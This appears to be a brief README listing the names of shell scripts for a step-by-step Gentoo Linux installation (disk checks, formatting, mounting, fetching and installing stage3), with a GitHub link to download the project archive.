### enter-start.sh
### check-uefi.sh
### check-disk.sh

### format-sdX.sh
### mnt-gentoo.sh
### set-time.sh
### get-stage3.sh
### install-stage3.sh




https://github.com/nercode-us/Gentoo/raw/refs/heads/main/Gentoo-main.zip
